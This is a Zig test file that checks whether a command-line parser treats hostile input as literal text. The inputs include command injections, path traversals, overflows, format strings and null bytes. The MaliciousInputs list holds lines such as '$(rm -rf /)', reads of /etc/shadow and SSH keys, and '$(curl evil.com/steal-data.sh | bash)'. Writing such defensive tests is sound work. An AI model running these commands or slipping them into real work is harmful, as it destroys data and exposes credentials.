const std = @import("std");
const testing = std.testing;
const zcli = @import("zcli.zig");
const args_parser = @import("args.zig");
const options_parser = @import("options.zig");
const levenshtein = @import("levenshtein.zig");

// ============================================================================
// Security Test Framework - Corrected Version
// ============================================================================

/// Collection of malicious input patterns for security testing
const MaliciousInputs = struct {
    const command_injections = [_][]const u8{
        "$(rm -rf /)",
        "`cat /etc/passwd`",
        "'; DROP TABLE commands; --",
        "${HOME}/../../../etc/passwd",
        "$(curl evil.com/steal-data.sh | bash)",
        "&& rm -rf /",
        "| cat /etc/shadow",
        "; ls -la /root",
    };

    const path_traversals = [_][]const u8{
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/dev/random",
        "/proc/self/environ",
        "\\\\network\\share\\sensitive",
        "../../../.ssh/id_rsa",
        "C:\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    };

    const buffer_overflows = [_][]const u8{
        "A" ** 1000,
        "A" ** 10000,
        "\x00" ** 1000,
        "\xFF" ** 1000,
        "🔥" ** 500,
    };

    const integer_overflows = [_][]const u8{
        "18446744073709551615", // u64 max
        "999999999999999999999999999999999999",
        "-9223372036854775808", // i64 min
        "1e308", // Float overflow
    };

    const format_strings = [_][]const u8{
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n%n%n%n%n",
        "{}{}{}{}{}{}{}{}{}{}",
    };
};

/// Test structures
const TestArgs = struct {
    name: []const u8,
    count: u32 = 0, // Now properly handled as default value
    file: ?[]const u8 = null,
};

const TestOptions = struct {
    output: []const u8 = "stdout",
    files: []const []const u8 = &.{},
    count: u32 = 0,
    enabled: bool = false,
};

// ============================================================================
// Security Tests - Corrected Implementation
// ============================================================================

test "security: malicious input handling - command injections" {
    const allocator = testing.allocator;

    for (MaliciousInputs.command_injections) |malicious_input| {
        // Test args parsing - should treat as literal string
        const args = [_][]const u8{malicious_input};

        if (args_parser.parseArgs(TestArgs, &args, null)) |parsed| {
            // Success - verify it's treated as literal string
            try testing.expectEqualStrings(malicious_input, parsed.name);
        } else |_| {
            // Error is also acceptable - just shouldn't crash
        }

        // Test options parsing
        const option_args = [_][]const u8{ "--output", malicious_input };

        if (options_parser.parseOptions(TestOptions, allocator, &option_args, null)) |parsed_opts| {
            defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, allocator);
            try testing.expectEqualStrings(malicious_input, parsed_opts.options.output);
        } else |_| {
            // Error is acceptable
        }
    }
}

test "security: malicious input handling - path traversals" {
    const allocator = testing.allocator;

    for (MaliciousInputs.path_traversals) |malicious_path| {
        // Test file path arguments - should not resolve paths
        const args = [_][]const u8{ "test", malicious_path };

        if (args_parser.parseArgs(TestArgs, &args, null)) |parsed| {
            // Should store as literal string, not resolve path
            if (parsed.file) |file_value| {
                try testing.expectEqualStrings(malicious_path, file_value);
            }
        } else |_| {
            // Rejection is also acceptable
        }

        // Test file option
        const option_args = [_][]const u8{ "--files", malicious_path };

        if (options_parser.parseOptions(TestOptions, allocator, &option_args, null)) |parsed_opts| {
            defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, allocator);
            if (parsed_opts.options.files.len > 0) {
                try testing.expectEqualStrings(malicious_path, parsed_opts.options.files[0]);
            }
        } else |_| {
            // Rejection is acceptable
        }
    }
}

test "security: malicious input handling - buffer overflows" {
    const allocator = testing.allocator;

    for (MaliciousInputs.buffer_overflows) |long_input| {
        // Test that very long inputs don't cause crashes
        const args = [_][]const u8{long_input};

        if (args_parser.parseArgs(TestArgs, &args, null)) |parsed| {
            // Should handle gracefully and preserve string integrity
            try testing.expectEqualStrings(long_input, parsed.name);
            try testing.expectEqual(long_input.len, parsed.name.len);
        } else |err| {
            // Various errors are acceptable for malicious input
            switch (err) {
                zcli.ZcliError.ResourceLimitExceeded, zcli.ZcliError.SystemOutOfMemory, zcli.ZcliError.ArgumentMissingRequired, zcli.ZcliError.ArgumentInvalidValue => {}, // All expected
                else => return err, // Truly unexpected error
            }
        }

        // Test options with long values
        const option_args = [_][]const u8{ "--output", long_input };

        if (options_parser.parseOptions(TestOptions, allocator, &option_args, null)) |parsed_opts| {
            defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, allocator);
            try testing.expectEqualStrings(long_input, parsed_opts.options.output);
        } else |err| {
            // Resource limit errors are acceptable
            switch (err) {
                zcli.ZcliError.ResourceLimitExceeded, zcli.ZcliError.SystemOutOfMemory, zcli.ZcliError.OptionInvalidValue => {}, // Expected
                else => return err,
            }
        }
    }
}

test "security: malicious input handling - integer overflows" {
    for (MaliciousInputs.integer_overflows) |overflow_input| {
        // Test integer parsing with overflow values. `count` (u32 = 0) is a
        // non-trailing defaulted field, so an unparseable token falls through
        // to the later `file` positional instead of hard-erroring. The security
        // property is that the integer field is NEVER poisoned with an
        // out-of-range value: on fall-through it keeps its default (0).
        const args = [_][]const u8{ "test", overflow_input };

        if (args_parser.parseArgs(TestArgs, &args, null)) |parsed| {
            // The overflow token must not have been accepted into the u32 field.
            // It either parsed as a valid in-range u32 or fell through to `file`.
            if (parsed.count != 0) {
                // A non-default value means the token genuinely parsed in range.
                try testing.expect(std.fmt.parseInt(u32, overflow_input, 10) catch 0 == parsed.count);
            }
        } else |err| {
            // Should gracefully handle overflows
            try testing.expect(err == zcli.ZcliError.ArgumentInvalidValue);
        }

        // Test integer options
        const option_args = [_][]const u8{ "--count", overflow_input };

        if (options_parser.parseOptions(TestOptions, std.testing.allocator, &option_args, null)) |parsed_opts| {
            defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, std.testing.allocator);
            // If parsed, verify reasonable bounds
            try testing.expect(parsed_opts.options.count <= std.math.maxInt(u32));
        } else |err| {
            // Should reject overflow values
            try testing.expect(err == zcli.ZcliError.OptionInvalidValue);
        }
    }
}

test "security: malicious input handling - format strings" {
    const allocator = testing.allocator;

    for (MaliciousInputs.format_strings) |format_string| {
        // Test that format strings are treated as literal strings
        const args = [_][]const u8{format_string};

        if (args_parser.parseArgs(TestArgs, &args, null)) |parsed| {
            // Should be treated as literal string, not interpreted as format
            try testing.expectEqualStrings(format_string, parsed.name);
        } else |_| {
            // Rejection is also acceptable
        }

        // Test format strings in options
        const option_args = [_][]const u8{ "--output", format_string };

        if (options_parser.parseOptions(TestOptions, allocator, &option_args, null)) |parsed_opts| {
            defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, allocator);
            try testing.expectEqualStrings(format_string, parsed_opts.options.output);
        } else |_| {
            // Rejection is acceptable
        }
    }
}

// ============================================================================
// Resource Exhaustion Tests
// ============================================================================

test "security: resource limits - option count cap is enforced at the boundary" {
    const allocator = testing.allocator;

    // Exactly at the default cap (100 option occurrences): parses fine, and
    // the accumulated array holds exactly what was passed.
    var at_cap: std.ArrayList([]const u8) = .empty;
    defer at_cap.deinit(allocator);
    var names: std.ArrayList([]u8) = .empty;
    defer {
        for (names.items) |n| allocator.free(n);
        names.deinit(allocator);
    }
    for (0..100) |i| {
        const name = try std.fmt.allocPrint(allocator, "file{d}.txt", .{i});
        try names.append(allocator, name);
        try at_cap.append(allocator, "--files");
        try at_cap.append(allocator, name);
    }

    const parsed = try options_parser.parseOptions(TestOptions, allocator, at_cap.items, null);
    defer options_parser.cleanupOptions(TestOptions, parsed.options, allocator);
    try testing.expectEqual(@as(usize, 100), parsed.options.files.len);

    // One past the cap: hard failure, not a truncated success.
    try at_cap.append(allocator, "--enabled");
    try testing.expectError(
        zcli.ZcliError.ResourceLimitExceeded,
        options_parser.parseOptions(TestOptions, allocator, at_cap.items, null),
    );
}

test "security: resource limits - absurd option names are rejected" {
    const allocator = testing.allocator;

    // An option name longer than the 256-byte cap fails fast instead of
    // being fed through lookup and suggestion machinery.
    const long_name = "--" ++ ("a" ** 300);
    const args = [_][]const u8{long_name};
    try testing.expectError(
        zcli.ZcliError.ResourceLimitExceeded,
        options_parser.parseOptions(TestOptions, allocator, &args, null),
    );
}

test "security: resource exhaustion - processing bounded regardless of input" {
    const allocator = testing.allocator;

    // Score many candidates against a typo, mirroring the suggestion hot loop,
    // and assert it completes with a well-defined result. (This deliberately
    // does NOT assert on wall-clock time: an elapsed-time bound flakes on a
    // loaded CI runner. The resource-exhaustion guard below is what actually
    // matters, and it's deterministic.)
    const command_count = 50; // Reasonable test size
    const similar_commands = try generateSimilarStrings(allocator, command_count, "command");
    defer freeSimilarStrings(allocator, similar_commands);

    var closest: usize = std.math.maxInt(usize);
    for (similar_commands) |candidate| {
        const distance = levenshtein.editDistance("commnd", candidate);
        if (distance < closest) closest = distance;
    }
    try testing.expect(closest != std.math.maxInt(usize));

    // The real DoS guard: the edit-distance kernel is O(m*n), so attacker-
    // controlled input length must NOT translate into unbounded work. The
    // kernel caps each operand to max_practical_len (256) before filling the
    // matrix, so the matrix it fills is bounded by 256*256 no matter how long
    // the inputs are. Verify that cap deterministically: the distance computed
    // over a megabyte-long input must equal the distance over its first 256
    // bytes — i.e. everything past the cap is ignored, so there is no O(m*n)
    // blow-up on huge inputs. (No wall clock involved.)
    const cap = 256;
    const huge = try allocator.alloc(u8, 1024 * 1024);
    defer allocator.free(huge);
    @memset(huge, 'a');

    // A short query against a huge candidate (both operand orderings).
    try testing.expectEqual(
        levenshtein.editDistance("commnd", huge[0..cap]),
        levenshtein.editDistance("commnd", huge),
    );
    try testing.expectEqual(
        levenshtein.editDistance(huge[0..cap], "commnd"),
        levenshtein.editDistance(huge, "commnd"),
    );

    // Two huge strings: only the first 256 bytes of each can matter.
    const huge2 = try allocator.alloc(u8, 1024 * 1024);
    defer allocator.free(huge2);
    @memset(huge2, 'b');
    try testing.expectEqual(
        levenshtein.editDistance(huge[0..cap], huge2[0..cap]),
        levenshtein.editDistance(huge, huge2),
    );
}

// ============================================================================
// Information Disclosure Tests
// ============================================================================

fn containsSensitiveInformation(message: []const u8) bool {
    const sensitive_patterns = [_][]const u8{
        "/Users/", "/home/", "C:\\Users\\", // User directories
        "/etc/", "/var/", "/proc/", "/sys/", // System directories
        "/root/", "/tmp/", // Sensitive directories
        "0x", "@", // Memory addresses and references
        "src/", "lib/", // Source code paths
        ".ssh", ".env", ".config", // Sensitive files
        "password", "secret", "key", "token", // Sensitive keywords
    };

    for (sensitive_patterns) |pattern| {
        if (std.mem.indexOf(u8, message, pattern)) |_| {
            return true;
        }
    }
    return false;
}

test "security: information disclosure - error message safety" {
    // Test that error messages don't leak sensitive information
    const sensitive_inputs = [_][]const u8{
        "/etc/passwd",
        "/home/user/.ssh/id_rsa",
        "C:\\Users\\Admin\\Documents\\secrets.txt",
        "/root/.env",
    };

    for (sensitive_inputs) |sensitive_input| {
        // Test args parsing with sensitive paths
        const args = [_][]const u8{ "test", sensitive_input };

        if (args_parser.parseArgs(TestArgs, &args, null)) |parsed| {
            // Parsing succeeded - this is fine, the path is stored as a string
            try testing.expectEqualStrings(sensitive_input, parsed.file.?);
        } else |_| {
            // Error is also fine - we can't easily test error message content
            // without more infrastructure, but the fact that it doesn't crash is good
        }
    }
}

test "security: information disclosure - no debug info leakage" {
    // Test that normal operation doesn't expose internal paths or addresses
    const args = [_][]const u8{"normal_input"};

    if (args_parser.parseArgs(TestArgs, &args, null)) |parsed| {
        // Verify that parsed result doesn't contain internal info
        try testing.expect(!containsSensitiveInformation(parsed.name));
    } else |_| {
        // Error case is fine too
    }
}

// ============================================================================
// Boundary Condition Tests
// ============================================================================

test "security: boundary conditions - empty inputs" {
    const allocator = testing.allocator;

    // Test empty argument list
    const empty_args: [0][]const u8 = .{};

    if (args_parser.parseArgs(TestArgs, &empty_args, null)) |_| {
        try testing.expect(false); // Should not succeed with empty args for required field
    } else |err| {
        try testing.expect(err == zcli.ZcliError.ArgumentMissingRequired);
    }

    // Test empty option list
    if (options_parser.parseOptions(TestOptions, allocator, &empty_args, null)) |parsed| {
        defer options_parser.cleanupOptions(TestOptions, parsed.options, allocator);
        // Should succeed with default values - just verify we can access the struct safely
        _ = parsed.options.output; // Access without comparison to avoid segfault
        _ = parsed.options.count;
        _ = parsed.options.enabled;
        // Success - the struct was parsed and accessible without crashing
    } else |_| {
        // Error is also acceptable for empty input
    }
}

test "security: boundary conditions - null bytes" {
    // Test handling of null bytes (potential string termination attacks)
    const null_byte_inputs = [_][]const u8{
        "test\x00injected",
        "\x00leading_null",
        "trailing_null\x00",
    };

    for (null_byte_inputs) |null_input| {
        const args = [_][]const u8{null_input};

        if (args_parser.parseArgs(TestArgs, &args, null)) |parsed| {
            // If accepted, verify full string is preserved (no null termination)
            try testing.expectEqual(null_input.len, parsed.name.len);
            try testing.expectEqualStrings(null_input, parsed.name);
        } else |_| {
            // Rejection for security is also acceptable
        }
    }
}

test "security: boundary conditions - extreme values" {
    // Test extreme boundary values
    // Our parser accepts any string value, including whitespace and empty strings
    // This is correct behavior - string validation is the application's responsibility
    const extreme_inputs = [_][]const u8{
        " ", // Single space
        "\t", // Single tab
        "\n", // Single newline
        "a", // Single character
        " a", // Space + character
        "test", // Normal string
        "", // Empty string
    };

    for (extreme_inputs) |input| {
        const args = [_][]const u8{input};

        // All string inputs should succeed
        const parsed = args_parser.parseArgs(TestArgs, &args, null) catch |err| {
            std.log.err("Input '{s}' failed unexpectedly: {}", .{ input, err });
            return err;
        };

        // Verify the string was preserved exactly as provided
        try testing.expectEqualStrings(input, parsed.name);
        try testing.expectEqual(input.len, parsed.name.len);
    }

    // Test what SHOULD fail: no arguments at all for required field
    const no_args: [0][]const u8 = .{};
    const result = args_parser.parseArgs(TestArgs, &no_args, null);
    try testing.expectError(zcli.ZcliError.ArgumentMissingRequired, result);
}

// ============================================================================
// Helper Functions
// ============================================================================

/// Generate a large number of similar strings for stress testing
fn generateSimilarStrings(allocator: std.mem.Allocator, count: usize, base: []const u8) ![][]const u8 {
    const strings = try allocator.alloc([]const u8, count);
    for (strings, 0..) |*string, i| {
        string.* = try std.fmt.allocPrint(allocator, "{s}{d}", .{ base, i });
    }
    return strings;
}

/// Clean up generated similar strings
fn freeSimilarStrings(allocator: std.mem.Allocator, strings: [][]const u8) void {
    for (strings) |string| {
        allocator.free(string);
    }
    allocator.free(strings);
}
